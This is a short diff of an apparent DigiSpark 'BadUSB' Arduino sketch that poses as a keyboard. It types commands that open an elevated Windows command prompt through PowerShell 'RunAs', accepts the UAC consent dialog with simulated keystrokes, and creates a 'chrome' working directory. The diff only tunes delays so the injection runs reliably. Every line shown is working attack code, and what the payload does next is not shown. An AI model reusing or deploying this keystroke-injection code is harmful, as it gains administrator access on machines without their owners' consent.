@@ -10,11 +10,11 @@ void setup()
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.println("powershell Start-Process cmd -Verb RunAs");
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.println("cd / & mkdir chrome & cd chrome");
